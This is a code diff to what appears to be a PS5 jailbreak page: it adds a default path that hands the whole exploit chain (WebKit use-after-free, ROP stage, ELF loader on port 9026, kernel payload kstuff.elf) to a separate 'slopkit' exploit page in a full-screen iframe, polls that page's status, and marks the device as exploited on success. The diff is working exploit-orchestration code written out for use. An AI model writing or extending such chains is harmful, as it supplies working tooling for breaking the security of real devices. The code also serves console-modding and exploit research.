@@ -1316,6 +1316,80 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy }) {
     throw new Error("elfldr did not bind on port 9026");
 }
 
+// ============================================================
+// RUNNER SELECTION
+// The stages above re-implement the whole chain inside this page. That works
+// for the primitive, but the page is a full UI and the ROP stage cannot spawn
+// its worker thread: the PS5 WebProcess is already carrying the exploit's
+// ~110 MB of graphs and answers "not enough system memory space".
+//
+// The validated slopkit run does the same work in a bare page, which is why
+// it fits. So by default we hand the whole job to slopkit-main/slopkit/poops.html
+// in an iframe and mirror its status here. Add "?inline=1" to force the
+// in-page path (useful for debugging the individual stages).
+// ============================================================
+const USE_VALIDATED_RUNNER = !/[?&]inline=1\b/.test(location.search);
+
+function runValidatedSlopkit() {
+    // Same URL slopkit-main/index.html links to, with attempts=8.
+    const url = "slopkit-main/slopkit/poops.html?go=1&auto=1&production=1"
+        + "&trigger=netcontrol&attempts=8"
+        + "&only=ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate,ps5_stage1,"
+        + "ps6_stage2,ps8_stage3,ps9_stage4,ps10_stage5"
+        + "&log=debug&payload=1&v=ktech2";
+
+    return new Promise((resolve) => {
+        const frame = document.createElement("iframe");
+        frame.id = "slopkit-runner";
+        frame.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;"
+            + "border:none;z-index:9999;background:#0c0c0f;";
+        frame.src = url;
+        document.body.appendChild(frame);
+        log("validated runner: handed the chain to slopkit poops.html", "log-info");
+
+        let done = false;
+        let timer = null, deadline = null;
+        const finish = (ok, error) => {
+            if (done) return;
+            done = true;
+            if (timer) clearInterval(timer);
+            if (deadline) clearTimeout(deadline);
+            // On success the ROP thread and elfldr live INSIDE the frame, so it
+            // must stay alive. Only tear it down on failure.
+            if (!ok) { try { frame.remove(); } catch (e) { } }
+            resolve({ success: ok, error: error || null });
+        };
+
+        let lastMark = "";
+        timer = setInterval(() => {
+            let fw = null;
+            try { fw = frame.contentWindow; } catch (e) { return; }
+            if (!fw) return;
+            try {
+                const marks = fw.jb && fw.jb.marks;
+                if (Array.isArray(marks) && marks.length) {
+                    const m = marks[marks.length - 1];
+                    const line = m.tag + ": " + m.detail;
+                    if (line !== lastMark) { lastMark = line; log(`slopkit: ${line}`, "log-info"); }
+                }
+            } catch (e) { }
+            try {
+                const doc = frame.contentDocument;
+                const cat = doc && doc.getElementById("cat");
+                const st = doc && doc.getElementById("status");
+                if (cat && cat.classList.contains("ok")) {
+                    log("slopkit runner reported success", "log-ok");
+                    finish(true);
+                } else if (cat && cat.classList.contains("bad")) {
+                    finish(false, (st && st.textContent) || "slopkit reported failure");
+                }
+            } catch (e) { }
+        }, 500);
+
+        deadline = setTimeout(() => finish(false, "slopkit runner timeout (300s)"), 300000);
+    });
+}
+
 async function loadKstuffViaElfldr() {
     log("Sending kstuff.elf to elfldr (port 9026)...", "log-info");
     const res = await fetch("payloads/kstuff.elf");
@@ -1355,6 +1429,17 @@ async function runFullExploitChain() {
     progress.textContent = "";
 
     try {
+        if (USE_VALIDATED_RUNNER) {
+            // Hand the entire chain (primitive -> ROP -> elfldr -> kstuff) to
+            // the validated slopkit page running in its own light context.
+            msg.textContent = "Running the validated slopkit chain...";
+            const r = await runValidatedSlopkit();
+            if (!r.success) throw new Error(r.error || "validated slopkit run failed");
+            log("validated slopkit chain finished", "log-ok");
+            exploitState.webkitExploited = true;
+            exploitState.elfldrLoaded = true;
+            exploitState.kernelExploited = true;
+        } else {
         await runWebKitUAF((detail) => { progress.textContent = detail; });
         exploitState.webkitExploited = true;
 
@@ -1387,6 +1472,7 @@ async function runFullExploitChain() {
         updateStageBadge("verify");
         msg.textContent = "Verifying jailbreak...";
         await verifyJailbreak();
+        }   // end of the ?inline=1 path
 
         exploitState.jailbroken = true;
         exploitState.stage = "complete";
